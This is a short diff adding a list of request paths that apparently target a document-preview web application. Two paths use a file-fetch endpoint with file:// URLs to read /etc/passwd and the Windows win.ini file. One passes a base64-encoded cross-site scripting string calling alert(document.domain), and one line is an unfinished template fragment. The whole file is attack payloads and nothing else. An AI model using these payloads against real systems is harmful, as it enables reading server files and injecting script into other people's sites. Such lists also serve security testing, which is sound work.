@@ -1,0 +1,5 @@
+/onlinePreview?url={{base64(
+/getCorsFile?urlPath=file:///etc/passwd
+/getCorsFile?urlPath=file:///c://windows/win.ini
+/index
+/picturesPreview?currentUrl=aHR0cDovLyIpO2FsZXJ0KGRvY3VtZW50LmRvbWFpbik7Ly8=&urls
